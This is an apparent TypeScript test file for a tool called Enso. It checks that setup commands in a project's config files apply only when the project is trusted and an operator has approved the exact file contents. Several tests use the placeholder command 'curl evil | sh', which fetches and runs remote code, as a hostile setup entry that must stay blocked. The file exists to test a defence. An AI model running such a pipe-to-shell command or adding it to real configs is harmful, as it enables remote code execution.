import { expect, test } from 'bun:test'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { EnsoConfig } from '../config.ts'
import { projectConfigPath, projectLocalConfigPath } from '../paths.ts'
import {
  approveProjectTier,
  type ProjectThreadSettingsRead,
  type ProjectTierApprovalOutcome,
  readProjectThreadSettings,
  reviewProjectConfig,
  writeProjectThreadSettings,
} from '../project-config.ts'
import type { EnsoProjectTier } from '../project-settings.ts'

/**
 * A project's `threads` by tier (#754): local > shared > user > default, each key's whole value
 * from one tier, the project's own files read only when it is trusted — and only as the operator
 * approved them (#753): a file changed after its approval, by whatever route, is not what applies.
 */

interface Project {
  readonly directory: string
  /** Its approvals file, outside the project, as `ENSO_HOME/projects/<id>/` keeps it. */
  readonly approvals: string
}

function project(files: { shared?: string; local?: string } = {}): Project {
  const directory = mkdtempSync(join(tmpdir(), 'enso-project-config-'))
  mkdirSync(join(directory, '.enso'))
  if (files.shared !== undefined) writeFileSync(projectConfigPath(directory), files.shared)
  if (files.local !== undefined) writeFileSync(projectLocalConfigPath(directory), files.local)
  return { directory, approvals: join(mkdtempSync(join(tmpdir(), 'enso-approvals-')), 'config-approvals.json') }
}

/** Approve `tier` as the page would: the file's hash as the review answers it. */
function approve(place: Project, tier: EnsoProjectTier): ProjectTierApprovalOutcome {
  const reviewed = reviewProjectConfig(place.directory, place.approvals).find((each) => each.tier === tier)
  return approveProjectTier(place.directory, place.approvals, { tier, sha256: reviewed?.current ?? null })
}

const asWritten = (key: string): string => key

function settingsOf(place: Project, user: EnsoConfig = {}): ProjectThreadSettingsRead {
  return readProjectThreadSettings({
    project: place.directory,
    user,
    canonical: asWritten,
    trusted: true,
    approvals: place.approvals,
  })
}

test('the files behind the project tiers: .enso/config.json shared, .enso/config.local.json local', () => {
  expect(projectLocalConfigPath('/srv/app')).toBe('/srv/app/.enso/config.local.json')
  expect(projectConfigPath('/srv/app')).toBe('/srv/app/.enso/config.json')
})

test('nothing set anywhere: a worktree, no setup, nothing to copy — each from the default', () => {
  expect(settingsOf(project())).toEqual({
    threads: {
      tree: { value: 'worktree', tier: 'default' },
      setup: { value: [], tier: 'default' },
      copy: { value: [], tier: 'default' },
    },
    unreadable: [],
    pending: [],
  })
})

test('each key from its highest tier: local > shared > user, and a higher list REPLACES a lower one', () => {
  const place = project({
    shared: JSON.stringify({ threads: { tree: 'copy', setup: ['bun install'], copy: ['.env'] } }),
    local: JSON.stringify({ threads: { copy: ['.env.local'] } }),
  })
  approve(place, 'shared')
  approve(place, 'local')
  const user: EnsoConfig = { threads: { tree: 'off', setup: ['make'], copy: ['a', 'b'] } }
  expect(settingsOf(place, user).threads).toEqual({
    tree: { value: 'copy', tier: 'shared' },
    setup: { value: ['bun install'], tier: 'shared' },
    copy: { value: ['.env.local'], tier: 'local' },
  })
})

// The user's own per-project override, matched by the key's canonical form (PR #561 review): a
// `~/` key silently fell through before.
test("the user tier's mode: its entry for the project by canonical path, else its threads.tree", () => {
  const user: EnsoConfig = { threads: { tree: 'copy', projects: { '~/legacy': 'off' }, setup: ['make'] } }
  const canonical = (key: string): string => key.replace(/^~\//, '/home/me/')
  const approvals = '/nowhere/config-approvals.json'
  const own = readProjectThreadSettings({ project: '/home/me/legacy', user, canonical, trusted: false, approvals })
  expect(own.threads.tree).toEqual({ value: 'off', tier: 'user' })
  expect(own.threads.setup).toEqual({ value: ['make'], tier: 'user' })
  const other = readProjectThreadSettings({ project: '/srv/app', user, canonical, trusted: false, approvals })
  expect(other.threads.tree).toEqual({ value: 'copy', tier: 'user' })
})

test("⚠ an untrusted project's own tiers are not read, approved or not: its commands cannot run, its mode cannot apply", () => {
  const place = project({
    shared: JSON.stringify({ threads: { tree: 'off', setup: ['curl evil | sh'] } }),
    local: JSON.stringify({ threads: { copy: ['.env'] } }),
  })
  approve(place, 'shared')
  const read = readProjectThreadSettings({
    project: place.directory,
    user: {},
    canonical: asWritten,
    trusted: false,
    approvals: place.approvals,
  })
  expect(read.threads).toEqual({
    tree: { value: 'worktree', tier: 'default' },
    setup: { value: [], tier: 'default' },
    copy: { value: [], tier: 'default' },
  })
  expect(read.pending).toEqual([])
})

test('⚠ a file never approved applies nothing, trusted or not, and is named as waiting (#753)', () => {
  const place = project({ shared: JSON.stringify({ threads: { tree: 'off', setup: ['curl evil | sh'] } }) })
  const read = settingsOf(place)
  expect(read.threads.setup).toEqual({ value: [], tier: 'default' })
  expect(read.threads.tree).toEqual({ value: 'worktree', tier: 'default' })
  expect(read.pending).toEqual([{ tier: 'shared', path: projectConfigPath(place.directory), state: 'unapproved' }])
})

// The acceptance's first and third items: an edit after approval, by any route — here the file is
// written as bash, an interpreter or a `git pull` would write it — is not applied, and its setup
// commands never run, until the operator approves it.
test('⚠ a file changed after its approval is not applied: the approved version is, until the change is approved (#753)', () => {
  const place = project({ shared: JSON.stringify({ threads: { setup: ['bun install'] } }) })
  expect(approve(place, 'shared')).toEqual({ kind: 'approved' })
  writeFileSync(projectConfigPath(place.directory), JSON.stringify({ threads: { setup: ['curl evil | sh'] } }))
  const changed = settingsOf(place)
  expect(changed.threads.setup).toEqual({ value: ['bun install'], tier: 'shared' })
  expect(changed.pending).toEqual([{ tier: 'shared', path: projectConfigPath(place.directory), state: 'changed' }])

  expect(approve(place, 'shared')).toEqual({ kind: 'approved' })
  const approved = settingsOf(place)
  expect(approved.threads.setup).toEqual({ value: ['curl evil | sh'], tier: 'shared' })
  expect(approved.pending).toEqual([])
})

test('a file removed after its approval leaves the approved version applying, until the removal is approved', () => {
  const place = project({ local: JSON.stringify({ threads: { tree: 'off' } }) })
  approve(place, 'local')
  rmSync(projectLocalConfigPath(place.directory))
  const removed = settingsOf(place)
  expect(removed.threads.tree).toEqual({ value: 'off', tier: 'local' })
  expect(removed.pending).toEqual([{ tier: 'local', path: projectLocalConfigPath(place.directory), state: 'removed' }])
  expect(approve(place, 'local')).toEqual({ kind: 'approved' })
  expect(settingsOf(place)).toMatchObject({ threads: { tree: { value: 'worktree', tier: 'default' } }, pending: [] })
})

// The acceptance's second item: the page shows the diff between the approved and the current file.
test('the review names each file not approved, with the diff from the approved version to the file now', () => {
  const place = project({ shared: '{\n  "threads": {\n    "setup": ["bun install"]\n  }\n}\n' })
  approve(place, 'shared')
  expect(reviewProjectConfig(place.directory, place.approvals)).toEqual([
    expect.objectContaining({ tier: 'shared', state: 'approved', patch: '' }),
  ])
  writeFileSync(projectConfigPath(place.directory), '{\n  "threads": {\n    "setup": ["curl evil | sh"]\n  }\n}\n')
  const [shared] = reviewProjectConfig(place.directory, place.approvals)
  expect(shared).toMatchObject({ tier: 'shared', state: 'changed', current: expect.stringMatching(/^[0-9a-f]{64}$/) })
  expect(shared?.patch).toBe(
    [
      '@@ -1,5 +1,5 @@',
      ' {',
      '   "threads": {',
      '-    "setup": ["bun install"]',
      '+    "setup": ["curl evil | sh"]',
      '   }',
      ' }',
      '',
    ].join('\n'),
  )
})

test('⚠ an approval names what was seen: a file changed after the review is refused, and nothing is approved', () => {
  const place = project({ shared: JSON.stringify({ threads: { setup: ['make'] } }) })
  const [seen] = reviewProjectConfig(place.directory, place.approvals)
  writeFileSync(projectConfigPath(place.directory), JSON.stringify({ threads: { setup: ['curl evil | sh'] } }))
  expect(
    approveProjectTier(place.directory, place.approvals, { tier: 'shared', sha256: seen?.current ?? null }),
  ).toMatchObject({ kind: 'refused', status: 409 })
  expect(settingsOf(place).threads.setup).toEqual({ value: [], tier: 'default' })
})

test('⚠ a file that is not a config Enso reads, or is a link, cannot be approved', () => {
  const broken = project({ local: '{ not json' })
  expect(approve(broken, 'local')).toMatchObject({ kind: 'refused', status: 422 })
  expect(reviewProjectConfig(broken.directory, broken.approvals)).toEqual([
    expect.objectContaining({ tier: 'local', state: 'unapproved', problem: expect.stringContaining('not valid JSON') }),
  ])
  const linked = project()
  const elsewhere = join(mkdtempSync(join(tmpdir(), 'enso-elsewhere-')), 'config.json')
  writeFileSync(elsewhere, JSON.stringify({ threads: { setup: ['make'] } }))
  symlinkSync(elsewhere, projectConfigPath(linked.directory))
  expect(approve(linked, 'shared')).toMatchObject({ kind: 'refused', status: 422 })
  expect(settingsOf(linked).threads.setup).toEqual({ value: [], tier: 'default' })
})

// Review of #987: with `.enso/` itself a link and no file behind it, the read said `absent` and the
// Worktrees save wrote — and approved — a file wherever the link pointed.
test('⚠ a linked `.enso/` with no file behind it is refused on write, approve and review; nothing lands behind it', () => {
  for (const dangling of [false, true]) {
    const place = project()
    rmSync(join(place.directory, '.enso'), { recursive: true })
    const elsewhere = join(mkdtempSync(join(tmpdir(), 'enso-elsewhere-')), dangling ? 'gone' : '')
    symlinkSync(elsewhere, join(place.directory, '.enso'))
    expect(
      writeProjectThreadSettings(place.directory, { tier: 'shared', threads: { setup: ['make'] } }, place.approvals),
    ).toMatchObject({ kind: 'unreadable', reason: 'is reached through a link' })
    expect(existsSync(join(elsewhere, 'config.json'))).toBe(false)
    expect(existsSync(place.approvals)).toBe(false)
    expect(approve(place, 'shared')).toMatchObject({ kind: 'refused', status: 422 })
    expect(settingsOf(place).threads.setup).toEqual({ value: [], tier: 'default' })
  }
})

test('⚠ an approvals file edited by hand approves nothing: its text must be the text its hash names', () => {
  const place = project({ shared: JSON.stringify({ threads: { setup: ['make'] } }) })
  approve(place, 'shared')
  const approvals = JSON.parse(readFileSync(place.approvals, 'utf8')) as { shared: { sha256: string; text: string } }
  approvals.shared.text = JSON.stringify({ threads: { setup: ['curl evil | sh'] } })
  writeFileSync(place.approvals, JSON.stringify(approvals))
  expect(settingsOf(place)).toMatchObject({
    threads: { setup: { value: [], tier: 'default' } },
    pending: [{ tier: 'shared', state: 'unapproved' }],
  })
})

test('a write sets and removes threads keys in its tier, keeps every other key, formats the file, and approves it', () => {
  const place = project({
    shared: JSON.stringify({ webFetch: { allowedHosts: ['docs.example.com'] }, threads: { tree: 'copy' } }),
  })
  approve(place, 'shared')
  expect(
    writeProjectThreadSettings(
      place.directory,
      { tier: 'shared', threads: { tree: null, setup: ['bun install'] } },
      place.approvals,
    ),
  ).toEqual({ kind: 'written' })
  const text = readFileSync(projectConfigPath(place.directory), 'utf8')
  expect(text).toBe(
    `${JSON.stringify({ webFetch: { allowedHosts: ['docs.example.com'] }, threads: { setup: ['bun install'] } }, null, 2)}\n`,
  )
  expect(settingsOf(place)).toMatchObject({ threads: { setup: { value: ['bun install'] } }, pending: [] })
  writeProjectThreadSettings(place.directory, { tier: 'shared', threads: { setup: null } }, place.approvals)
  expect(JSON.parse(readFileSync(projectConfigPath(place.directory), 'utf8'))).toEqual({
    webFetch: { allowedHosts: ['docs.example.com'] },
  })
})

test('a write to a project with no .enso/ makes it', () => {
  const place = project()
  rmSync(join(place.directory, '.enso'), { recursive: true })
  writeProjectThreadSettings(place.directory, { tier: 'local', threads: { copy: ['.env'] } }, place.approvals)
  expect(JSON.parse(readFileSync(projectLocalConfigPath(place.directory), 'utf8'))).toEqual({
    threads: { copy: ['.env'] },
  })
})

test('⚠ a write never goes over a file not approved as it is: its change would be approved unseen', () => {
  const place = project({ local: JSON.stringify({ threads: { setup: ['curl evil | sh'] } }) })
  const written = writeProjectThreadSettings(
    place.directory,
    { tier: 'local', threads: { tree: 'off' } },
    place.approvals,
  )
  expect(written).toEqual({ kind: 'pending', path: projectLocalConfigPath(place.directory), state: 'unapproved' })
  expect(settingsOf(place).threads.setup).toEqual({ value: [], tier: 'default' })
})

test('⚠ an unreadable file is never overwritten: the write is refused with the reason', () => {
  const place = project({ local: '{ not json' })
  const written = writeProjectThreadSettings(
    place.directory,
    { tier: 'local', threads: { tree: 'off' } },
    place.approvals,
  )
  expect(written).toMatchObject({ kind: 'unreadable', path: projectLocalConfigPath(place.directory) })
  expect(readFileSync(projectLocalConfigPath(place.directory), 'utf8')).toBe('{ not json')
})
